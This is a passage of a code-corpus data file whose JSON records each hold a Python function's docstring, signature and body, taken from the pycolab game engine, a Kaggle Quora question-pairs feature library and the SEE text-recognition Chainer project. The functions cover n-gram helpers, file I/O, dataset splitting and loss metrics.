"apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Construct a `Sprite`.\n\nWhatever arguments your `Sprite` subclass takes, its first three should be\nthe same `corner`, `position`, and `character` arguments taken here.\n\nUnless you really know what you're doing, your `Sprite` subclass should be\ncertain to call this `__init__` method before doing anything else in its own\nconstructor. Here's example code to copy and paste:\n\n    super(MyCoolSprite, self).__init__(corner, position, character)\n\nA `Sprite` object that does not wish to be visible after construction should\nhave its constructor assign `self._visible = False` after calling its\nsuperclass constructor.\n\nArgs:\n  corner: A `self.Position` instance whose `row` member is the height of the\n      game board and whose `col` member is the width of the game board.\n      These values should always be larger than the `row` and `col` position\n      of this sprite respectively.\n  position: A `self.Position` instance encoding the initial position of\n      this sprite.\n  character: The character that this `Sprite` paints onto the board.\n      Subclasses will not paint this character directly; it's here for\n      the object's reference when examining the arguments to `update`.\n\"\"\"\n# The corner member is not to be accessed directly.\n", "func_signal": "def __init__(self, corner, position, character):\n", "code": "self._c_o_r_n_e_r = corner\n# The character member is not to be accessed directly.\nself._c_h_a_r_a_c_t_e_r = character\n# The position member is fine for internal access, but external callers\n# must use the property. Note that the use of a namedtuple means that\n# positions are always passed (and updated) by value.\nself._position = position\n# By default, we have a simple flag that determines whether this Sprite is\n# visible. It's fine for subclasses to access and mutate this flag directly,\n# or to override the self.visible property function altogether.\nself._visible = True", "path": "pycolab\\things.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"The default cropper passes observations through unchanged.\"\"\"\n# This test also helps check basic cropper functionality in assertMachinima.\n\n# Our test takes place in this world.\n", "func_signal": "def testDefaultCropper(self):\n", "code": "art = ['.......',\n       '.#####.',\n       '.#   #.',\n       '.# P #.',\n       '.#   #.',\n       '.#####.',\n       '.......']\n\n# In a fresh engine, execute a (short!) sequence of motions with two None\n# croppers specified. For these, assertMachinima should use the default\n# cropper, cropping.ObservationCropper, which passes observations through.\n# (We cheat a bit on the croppers arg to MakeEngine in this case: there's\n# no need to \"reset\" the default cropper.)\nself.assertMachinima(\n    engine=self.make_engine(art, []),\n    croppers=[None, None],\n    frames=[\n        ('stay',        # After executing this action...\n         [['.......',\n           '.#####.',   # ...we expect this from the first cropper...\n           '.#   #.',\n           '.# P #.',\n           '.#   #.',\n           '.#####.',\n           '.......'],\n\n          ['.......',\n           '.#####.',   # ...and this from the second cropper.\n           '.#   #.',\n           '.# P #.',\n           '.#   #.',\n           '.#####.',\n           '.......']]),\n    ],\n)", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"\nSave dict instance to disk with CSV format\n:param dic: dict instance\n:param header: header of CSV file\n:param out_fp: output file path\n:return: none\n\"\"\"\n", "func_signal": "def save_dic2csv(dic, header, out_fp):\n", "code": "fout = open(out_fp, 'w')\nfout.write('%s\\n' % header)\nfor k in dic:\n    fout.write('\"%s\",\"%s\"\\n' % (k, dic[k].replace(\"\\\"\", \"\\\"\\\"\")))\nfout.close()", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nSave vector on disk\n:param file_path: vector file path\n:param vector: a vector in List type\n:param mode: mode of writing file\n:return: none\n\"\"\"\n", "func_signal": "def save_vector(file_path, vector, mode):\n", "code": "file = open(file_path, mode)\nfor value in vector:\n    file.write(str(value) + \"\\n\")\nfile.close()\nreturn", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n   Input: a list of words, e.g., [\"I\", \"am\", \"Denny\"]\n   Output: a list of bigram, e.g., [\"I_am\", \"am_Denny\"]\n\"\"\"\n", "func_signal": "def bigrams(words, join_string, skip=0):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 1:\n    lst = []\n    for i in range(L - 1):\n        for k in range(1, skip + 2):\n            if i + k < L:\n                lst.append(join_string.join([words[i], words[i + k]]))\nelse:\n    # set it as unigram\n    lst = NgramUtil.unigrams(words)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nConvert the number from decimal to binary\n:param x: decimal number\n:return: string represented binary format of `x`\n\"\"\"\n", "func_signal": "def int2binarystr(x):\n", "code": "s = \"\"\nwhile x:\n    s += \"1\" if (x & 0x01) else \"0\"\n    x >>= 1\nreturn s[::-1]", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nCalculate the number of bits which are 1\n:param x: number which will be calculated\n:return: number of bits in `x`\n\"\"\"\n", "func_signal": "def count_one_bits(x):\n", "code": "n = 0\nwhile x:\n    n += 1 if (x & 0x01) else 0\n    x >>= 1\nreturn n", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nRandom split data set with rates\n:param instances: data set\n:param rates: Proportions of each part of the data\n:return: list of subsets\n\"\"\"\n", "func_signal": "def random_split(instances, rates):\n", "code": "LogUtil.log(\"INFO\", \"random split data(N=%d) into %d parts, with rates(%s) ...\" % (\n    len(instances), len(rates), str(rates)))\nslices = []\npre_sum_rates = []\nsum_rates = 0.0\nfor rate in rates:\n    slices.append([])\n    pre_sum_rates.append(sum_rates + rate)\n    sum_rates += rate\nfor instance in instances:\n    randn = random.random()\n    for i in range(0, len(pre_sum_rates)):\n        if randn < pre_sum_rates[i]:\n            slices[i].append(instance)\n            break\nn_slices = []\nfor slic in slices:\n    n_slices.append(len(slic))\nLogUtil.log(\"INFO\", \"random split data done, with number of instances(%s).\" % (str(n_slices)))\nreturn slices", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n    Input: a list of words, e.g., [\"I\", \"am\", \"Denny\", \"boy\"]\n    Output: a list of trigram, e.g., [\"I_am_Denny_boy\"]\n\"\"\"\n", "func_signal": "def fourgrams(words, join_string):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 3:\n    lst = []\n    for i in xrange(L - 3):\n        lst.append(join_string.join([words[i], words[i + 1], words[i + 2], words[i + 3]]))\nelse:\n    # set it as trigram\n    lst = NgramUtil.trigrams(words, join_string)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "# load configuration file\n", "func_signal": "def __init__(self, config_fp):\n", "code": "if isinstance(config_fp, str):\n    self.config = ConfigParser.ConfigParser()\n    self.config.read(config_fp)\nelse:\n    self.config = config_fp\nself.model = None", "path": "bin\\featwheel\\model.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n   Input: a list of words, e.g., [\"I\", \"am\", \"Denny\"]\n   Output: a list of trigram, e.g., [\"I_am_Denny\"]\n\"\"\"\n", "func_signal": "def trigrams(words, join_string, skip=0):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 2:\n    lst = []\n    for i in range(L - 2):\n        for k1 in range(1, skip + 2):\n            for k2 in range(1, skip + 2):\n                if i + k1 < L and i + k1 + k2 < L:\n                    lst.append(join_string.join([words[i], words[i + k1], words[i + k1 + k2]]))\nelse:\n    # set it as bigram\n    lst = NgramUtil.bigrams(words, join_string, skip)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nSave matrix on disk\n:param file_path: matrix file path\n:param instances: a matrix in 2-dim List type\n:param mode: mode of writing file\n:return: none\n\"\"\"\n", "func_signal": "def save_matrix(file_path, instances, mode):\n", "code": "file = open(file_path, mode)\nfor instance in instances:\n    file.write(','.join([str(instance[i]) for i in range(len(instance))]))\n    file.write('\\n')\nfile.close()\nreturn", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n    Input: a list of words, e.g., [\"I\", \"am\", \"Denny\", \"boy\", \"ha\"]\n    Output: a list of fourterm, e.g., [\"I_am_Denny_boy\", \"I_am_Denny_ha\", \"I_am_boy_ha\", \"I_Denny_boy_ha\", \"am_Denny_boy_ha\"]\n\"\"\"\n", "func_signal": "def fourterms(words, join_string):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 3:\n    lst = []\n    for i in xrange(L - 3):\n        for j in xrange(i + 1, L - 2):\n            for k in xrange(j + 1, L - 1):\n                for l in xrange(k + 1, L):\n                    lst.append(join_string.join([words[i], words[j], words[k], words[l]]))\nelse:\n    # set it as triterm\n    lst = NgramUtil.triterms(words, join_string)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nwrapper for ngram\n\"\"\"\n", "func_signal": "def ngrams(words, ngram, join_string=\" \"):\n", "code": "if ngram == 1:\n    return NgramUtil.unigrams(words)\nelif ngram == 2:\n    return NgramUtil.bigrams(words, join_string)\nelif ngram == 3:\n    return NgramUtil.trigrams(words, join_string)\nelif ngram == 4:\n    return NgramUtil.fourgrams(words, join_string)\nelif ngram == 12:\n    unigram = NgramUtil.unigrams(words)\n    bigram = [x for x in NgramUtil.bigrams(words, join_string) if len(x.split(join_string)) == 2]\n    return unigram + bigram\nelif ngram == 123:\n    unigram = NgramUtil.unigrams(words)\n    bigram = [x for x in NgramUtil.bigrams(words, join_string) if len(x.split(join_string)) == 2]\n    trigram = [x for x in NgramUtil.trigrams(words, join_string) if len(x.split(join_string)) == 3]\n    return unigram + bigram + trigram", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n    Input: a list of words, e.g., [\"I\", \"am\", \"Denny\"]\n    Output: a list of unigram\n\"\"\"\n", "func_signal": "def unigrams(words):\n", "code": "assert type(words) == list\nreturn words", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nLoad matrix from disk\n:param file_path: matrix file path\n:return: a matrix in 2-dim List type\n\"\"\"\n", "func_signal": "def load_matrix(file_path):\n", "code": "matrix = []\nfile = open(file_path)\nfor line in file:\n    vector = line.strip().split(',')\n    vector = [float(vector[i]) for i in range(len(vector))]\n    matrix.append(vector)\nfile.close()\nLogUtil.log(\"INFO\", \"load matrix done. size=(%d,%d)\" % (len(matrix), len(matrix[0])))\nreturn matrix", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nCalculate correlation between specified feature and labels\n:param x: specified feature in numpy\n:param y_train: labels in numpy\n:return: value of correlation\n\"\"\"\n", "func_signal": "def corr(x, y_train):\n", "code": "if MathUtil.dim(x) == 1:\n    corr = pearsonr(x.flatten(), y_train)[0]\n    if str(corr) == \"nan\":\n        corr = 0.\nelse:\n    corr = 1.\nreturn corr", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\ntry to divide two numbers\n\"\"\"\n", "func_signal": "def try_divide(x, y, val=0.0):\n", "code": "if y != 0.0:\n    val = float(x) / y\nreturn val", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"wrapper for nterm\"\"\"\n", "func_signal": "def nterms(words, nterm, join_string=\" \"):\n", "code": "if nterm == 1:\n    return NgramUtil.uniterms(words)\nelif nterm == 2:\n    return NgramUtil.biterms(words, join_string)\nelif nterm == 3:\n    return NgramUtil.triterms(words, join_string)\nelif nterm == 4:\n    return NgramUtil.fourterms(words, join_string)", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n    Input: a list of words, e.g., [\"I\", \"am\", \"Denny\", \"boy\"]\n    Output: a list of biterm, e.g., [\"I_am\", \"I_Denny\", \"I_boy\", \"am_Denny\", \"am_boy\", \"Denny_boy\"]\n\"\"\"\n", "func_signal": "def biterms(words, join_string):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 1:\n    lst = []\n    for i in range(L - 1):\n        for j in range(i + 1, L):\n            lst.append(join_string.join([words[i], words[j]]))\nelse:\n    # set it as uniterm\n    lst = NgramUtil.uniterms(words)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\n    Input: a list of words, e.g., [\"I\", \"am\", \"Denny\", \"boy\"]\n    Output: a list of triterm, e.g., [\"I_am_Denny\", \"I_am_boy\", \"I_Denny_boy\", \"am_Denny_boy\"]\n\"\"\"\n", "func_signal": "def triterms(words, join_string):\n", "code": "assert type(words) == list\nL = len(words)\nif L > 2:\n    lst = []\n    for i in xrange(L - 2):\n        for j in xrange(i + 1, L - 1):\n            for k in xrange(j + 1, L):\n                lst.append(join_string.join([words[i], words[j], words[k]]))\nelse:\n    # set it as biterm\n    lst = NgramUtil.biterms(words, join_string)\nreturn lst", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "\"\"\"\nLoad vector from disk\n:param file_path: vector file path\n:param ele_type: element type in vector\n:return: a vector in List type\n\"\"\"\n", "func_signal": "def load_vector(file_path, ele_type):\n", "code": "assert ele_type.lower() in DataUtil.valid_types, \"Wrong ele_type: %s\" % ele_type\nele_type = eval(ele_type.lower())\nvector = []\nf = open(file_path)\nfor line in f:\n    value = ele_type(line.strip())\n    vector.append(value)\nf.close()\nLogUtil.log(\"INFO\", \"load vector done. length=%d\" % (len(vector)))\nreturn vector", "path": "bin\\featwheel\\utils.py", "repo_name": "HouJP/kaggle-quora-question-pairs", "stars": 731, "license": "None", "language": "python", "size": 7768}
{"docstring": "# first render localization visualization\n", "func_signal": "def show_backprop_vis(self, backprop_vis, dest_image, image, num_timesteps):\n", "code": "for j, vis in enumerate(backprop_vis[0]):\n    backprop_image = self.array_to_image(self.xp.tile(vis, (3, 1, 1)))\n    dest_image.paste(backprop_image, ((j + 1) * self.image_size.width, image.height))\n# second render recognition visualization\n_, num_channels, height, width = backprop_vis[1].shape\nrecognition_vis = self.xp.reshape(backprop_vis[1], (num_timesteps, -1, num_channels, height, width))\nfor i in range(len(recognition_vis)):\n    for j, vis in enumerate(recognition_vis[i]):\n        backprop_image = self.array_to_image(self.xp.tile(vis, (3, 1, 1)))\\\n            .resize((self.image_size.width, self.image_size.height))\n        dest_image.paste(backprop_image, ((j + 1) * self.image_size.width, (i + 2) * image.height))", "path": "chainer\\insights\\fsns_bbox_plotter.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# concat all individual predictions and slice for each time step\n", "func_signal": "def decode_predictions(self, predictions):\n", "code": "predictions = predictions[0]\n\nwith cuda.get_device_from_array(predictions.data):\n    prediction = F.squeeze(predictions, axis=1)\n    classification = F.softmax(prediction, axis=1)\n    classification = classification.data\n    classification = self.xp.argmax(classification, axis=1)\n\n    words = self.loss_metrics.strip_prediction(classification[self.xp.newaxis, ...])[0]\n    word = \"\".join(map(self.loss_metrics.label_to_char, words))\n\nreturn word", "path": "chainer\\insights\\textrec_bbox_plotter.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# penalize bboxes that are not high enough to contain text (10 pixels)\n", "func_signal": "def calc_height_loss(self, height):\n", "code": "shifted_height = height - 10\nthresholded_height = F.minimum(shifted_height, self.xp.zeros_like(shifted_height))\nthresholded_height *= -1\n\nreturn F.average(thresholded_height)", "path": "chainer\\metrics\\loss_metrics.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Computes the loss value for an input and label pair.\n\nIt also computes accuracy and stores it to the attribute.\n\nArgs:\n    args (list of ~chainer.Variable): Input minibatch.\n\nThe all elements of ``args`` but last one are features and\nthe last element corresponds to ground truth labels.\nIt feeds features to the predictor and compare the result\nwith ground truth labels.\n\nReturns:\n    ~chainer.Variable: Loss value.\n\n\"\"\"\n", "func_signal": "def __call__(self, *args):\n", "code": "assert len(args) >= 2\nx = args[:-1]\nt = args[-1]\nself.y = None\nself.loss = None\nif self.provide_label_during_forward:\n    self.y = self.predictor(*x, t)\nelse:\n    self.y = self.predictor(*x)\nself.loss = self.lossfun(self.y, t)\nreporter.report({'loss': self.loss}, self)\nif self.compute_accuracy:\n    reported_accuracies = self.accfun(self.y, t)\n    if len(self.accuracy_types) == 1:\n        reported_accuracies = reported_accuracies,\n    report = {accuracy_type: reported_accuracy\n              for accuracy_type, reported_accuracy in zip(self.accuracy_types, reported_accuracies)}\n    reporter.report(report, self)\nreturn self.loss", "path": "chainer\\utils\\multi_accuracy_classifier.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Splits a dataset into ``n`` subsets.\nArgs:\n    dataset: Dataset to split.\n    n(int): The number of subsets.\n    order (sequence of ints): Permutation of indexes in the base dataset.\n        See the document of :class:`SubDataset` for details.\nReturns:\n    list: List of ``n`` :class:`SubDataset` objects.\n        Each subset contains the examples of indexes\n        ``order[i * (len(dataset) // n):(i + 1) * (len(dataset) // n)]``\n        .\n\"\"\"\n", "func_signal": "def split_dataset_n(dataset, n, order=None):\n", "code": "n_examples = len(dataset)\nsub_size = n_examples // n\nreturn [PaddableSubDataset(dataset, sub_size * i, sub_size * (i + 1), order)\n        for i in range(n)]", "path": "chainer\\datasets\\sub_dataset.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Splits a dataset into two subsets randomly.\nThis function creates two instances of :class:`SubDataset`. These instances\ndo not share any examples, and they together cover all examples of the\noriginal dataset. The split is automatically done randomly.\nArgs:\n    dataset: Dataset to split.\n    first_size (int): Size of the first subset.\n    seed (int): Seed the generator used for the permutation of indexes.\n        If an integer being convertible to 32 bit unsigned integers is\n        specified, it is guaranteed that each sample\n        in the given dataset always belongs to a specific subset.\n        If ``None``, the permutation is changed randomly.\nReturns:\n    tuple: Two :class:`SubDataset` objects. The first subset contains\n        ``first_size`` examples randomly chosen from the dataset without\n        replacement, and the second subset contains the rest of the\n        dataset.\n\"\"\"\n", "func_signal": "def split_dataset_random(dataset, first_size, seed=None):\n", "code": "order = numpy.random.RandomState(seed).permutation(len(dataset))\nreturn split_dataset(dataset, first_size, order)", "path": "chainer\\datasets\\sub_dataset.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Increase dfficulty of learning curriculum\"\"\"\n", "func_signal": "def do_increasedifficulty(self, arg):\n", "code": "if self.curriculum is not None:\n    self.curriculum.force_enlarge_dataset = True", "path": "chainer\\commands\\interactive_train.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# start with a default font size that should be large enough to be too large\n", "func_signal": "def find_font_size(draw, text_lines, max_width, max_height, spacing):\n", "code": "font_size = 35\n\n# reload the font until the word fits or the font size would be too small\nwhile True:\n    font = ImageFont.truetype(random.choice(FONTS), size=font_size, encoding='unic')\n    text_width, text_height = draw.multiline_textsize(text_lines, font, spacing=spacing)\n\n    if text_width <= max_width and text_height <= max_height:\n        return font, (text_width, text_height)\n\n    font_size -= 1\n\n    if font_size <= 1:\n        raise ValueError('Can not draw Text on given image')", "path": "datasets\\fsns\\render_text_on_signs.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# TODO Parallelize\n", "func_signal": "def strip_prediction(self, predictions):\n", "code": "words = []\nfor prediction in predictions:\n    blank_symbol_seen = False\n    stripped_prediction = self.xp.full((1,), prediction[0], dtype=self.xp.int32)\n    for char in prediction:\n        if char == self.blank_symbol:\n            blank_symbol_seen = True\n            continue\n        if char == stripped_prediction[-1] and not blank_symbol_seen:\n            continue\n        blank_symbol_seen = False\n        stripped_prediction = self.xp.hstack((stripped_prediction, char.reshape(1, )))\n    words.append(stripped_prediction)\nreturn words", "path": "chainer\\metrics\\textrec_metrics.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Proxy all calls that can not be handled by this class to base optimizer\"\"\"\n", "func_signal": "def __getattribute__(self, item):\n", "code": "try:\n    v = object.__getattribute__(self, item)\nexcept AttributeError:\n    v = getattr(object.__getattribute__(self, 'base_optimizer'), item)\nreturn v", "path": "chainer\\optimizers\\multi_net_optimizer.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Splits a dataset into two subsets.\nThis function creates two instances of :class:`SubDataset`. These instances\ndo not share any examples, and they together cover all examples of the\noriginal dataset.\nArgs:\n    dataset: Dataset to split.\n    split_at (int): Position at which the base dataset is split.\n    order (sequence of ints): Permutation of indexes in the base dataset.\n        See the document of :class:`SubDataset` for details.\nReturns:\n    tuple: Two :class:`SubDataset` objects. The first subset represents the\n        examples of indexes ``order[:split_at]`` while the second subset\n        represents the examples of indexes ``order[split_at:]``.\n\"\"\"\n", "func_signal": "def split_dataset(dataset, split_at, order=None):\n", "code": "n_examples = len(dataset)\nif split_at < 0:\n    raise ValueError('split_at must be non-negative')\nif split_at >= n_examples:\n    raise ValueError('split_at exceeds the dataset size')\nsubset1 = PaddableSubDataset(dataset, 0, split_at, order)\nsubset2 = PaddableSubDataset(dataset, split_at, n_examples, order)\nreturn subset1, subset2", "path": "chainer\\datasets\\sub_dataset.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# penalize aspect ratios that are higher than wide, and penalize aspect ratios that are tooo wide\n", "func_signal": "def calc_aspect_ratio_loss(self, width, height, label_lengths=None):\n", "code": "aspect_ratio = height / F.maximum(width, self.xp.ones_like(width))\n# do not give an incentive to bboxes with a width that is 2x the height of the box\naspect_loss = F.maximum(aspect_ratio - 0.5, self.xp.zeros_like(aspect_ratio))\n\n# penalize very long bboxes (based on the underlying word), by assuming that a single letter\n# has a max width of its height, if the width of the bbox is too large it will be penalized\nif label_lengths is not None:\n    max_width = label_lengths * height\n    width_ratio = width - max_width\n    width_threshold = F.maximum(width_ratio, self.xp.zeros_like(width_ratio))\n    aspect_loss = aspect_ratio + width_threshold\n\nreturn sum(aspect_loss) / len(aspect_loss)", "path": "chainer\\metrics\\loss_metrics.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# TODO Parallelize\n", "func_signal": "def strip_prediction(self, predictions):\n", "code": "words = []\nfor prediction in predictions:\n    blank_symbol_seen = False\n    stripped_prediction = self.xp.full((1,), prediction[0], dtype=self.xp.int32)\n    for char in prediction:\n        if char == self.blank_symbol:\n            blank_symbol_seen = True\n            continue\n        if char == stripped_prediction[-1] and not blank_symbol_seen:\n            continue\n        blank_symbol_seen = False\n        stripped_prediction = self.xp.hstack((stripped_prediction, char.reshape(1,)))\n    words.append(stripped_prediction)\nreturn words", "path": "chainer\\metrics\\ctc_metrics.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Updates parameters based on a loss function or computed gradients.\n    This method runs in two ways.\n    - If ``lossfun`` is given, then it is used as a loss function to\n      compute gradients.\n    - Otherwise, this method assumes that the gradients are already\n      computed.\n    In both cases, the computed gradients are used to update parameters.\n    The actual update routines are defined by the update rule of each\n    parameter.\n\"\"\"\n", "func_signal": "def update(self, lossfun=None, *args, **kwargs):\n", "code": "if lossfun is not None:\n    use_cleargrads = getattr(self, '_use_cleargrads', True)\n    loss = lossfun(*args, **kwargs)\n    if use_cleargrads:\n        self.target.cleargrads()\n    else:\n        self.target.zerograds()\n    loss.backward()\n    del loss\n\nself.reallocate_cleared_grads()\n\nself.call_hooks()\n\nself.t += 1\nself.base_optimizer.t = self.t\n\nif self.t % self.optimize_all_interval == 0:\n    # update all params\n    for param in self.target.params():\n        param.update()\nelse:\n    # only update params in extra links\n    for link in self.extra_links:\n        for param in link.params():\n            param.update()", "path": "chainer\\optimizers\\multi_net_optimizer.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "\"\"\"Splits a dataset into ``n`` subsets randomly.\nArgs:\n    dataset: Dataset to split.\n    n(int): The number of subsets.\n    seed (int): Seed the generator used for the permutation of indexes.\n        If an integer being convertible to 32 bit unsigned integers is\n        specified, it is guaranteed that each sample\n        in the given dataset always belongs to a specific subset.\n        If ``None``, the permutation is changed randomly.\nReturns:\n    list: List of ``n`` :class:`SubDataset` objects.\n        Each subset contains ``len(dataset) // n`` examples randomly chosen\n        from the dataset without replacement.\n\"\"\"\n", "func_signal": "def split_dataset_n_random(dataset, n, seed=None):\n", "code": "n_examples = len(dataset)\nsub_size = n_examples // n\norder = numpy.random.RandomState(seed).permutation(len(dataset))\nreturn [PaddableSubDataset(dataset, sub_size * i, sub_size * (i + 1), order)\n        for i in range(n)]", "path": "chainer\\datasets\\sub_dataset.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# Step 1: build network\n", "func_signal": "def create_network(args, log_data):\n", "code": "localization_net_class_name, localization_module_name = get_class_and_module(log_data['localization_net'])\nmodule = load_module(os.path.abspath(os.path.join(args.model_dir, localization_module_name)))\nlocalization_net_class = eval('module.{}'.format(localization_net_class_name))\nlocalization_net = build_localization_net(localization_net_class, args)\n\nrecognition_net_class_name, recognition_module_name = get_class_and_module(log_data['recognition_net'])\nmodule = load_module(os.path.abspath(os.path.join(args.model_dir, recognition_module_name)))\nrecognition_net_class = eval('module.{}'.format(recognition_net_class_name))\nrecognition_net = build_recognition_net(recognition_net_class, target_shape, args)\n\nfusion_net_class_name, fusion_module_name = get_class_and_module(log_data['fusion_net'])\nmodule = load_module(os.path.abspath(os.path.join(args.model_dir, fusion_module_name)))\nfusion_net_class = eval('module.{}'.format(fusion_net_class_name))\nnet = build_fusion_net(fusion_net_class, localization_net, recognition_net)\n\nif args.gpu >= 0:\n    net.to_gpu(args.gpu)\n\nreturn net", "path": "chainer\\fsns_demo.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# TODO Parallelize\n", "func_signal": "def strip_prediction(self, predictions):\n", "code": "words = []\nfor prediction in predictions:\n    stripped_prediction = self.xp.empty((0,), dtype=self.xp.int32)\n    for char in prediction:\n        if char == self.blank_symbol:\n            continue\n        stripped_prediction = self.xp.hstack((stripped_prediction, char.reshape(1,)))\n    words.append(stripped_prediction)\nreturn words", "path": "chainer\\metrics\\loss_metrics.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# we can remove homogeneous axis, as it is still 0 0 1\n", "func_signal": "def remove_homogeneous_coordinates(self, transformation_params):\n", "code": "axes = F.split_axis(transformation_params, 3, axis=1, force_tuple=True)\nreturn F.concat(axes[:-1], axis=1)", "path": "chainer\\models\\ic_stn.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# check whether system already settled and we can enlarge train set\n", "func_signal": "def training_converged(self):\n", "code": "reference_value = self.queue[self.maxlen-1]\ndeltas = []\nfor value in self.queue:\n    deltas.append(abs(value - reference_value))\n\nmean = statistics.mean(deltas)\nreturn mean <= self.min_delta", "path": "chainer\\utils\\baby_step_curriculum.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
{"docstring": "# TODO Parallelize\n", "func_signal": "def strip_prediction(self, predictions):\n", "code": "words = []\nfor prediction in predictions:\n    stripped_prediction = self.xp.empty((0,), dtype=self.xp.int32)\n    for char in prediction:\n        if char == self.blank_symbol:\n            continue\n        stripped_prediction = self.xp.hstack((stripped_prediction, char.reshape(1, )))\n    words.append(stripped_prediction)\nreturn words", "path": "chainer\\evaluation\\evaluator.py", "repo_name": "Bartzi/see", "stars": 572, "license": "gpl-3.0", "language": "python", "size": 547}
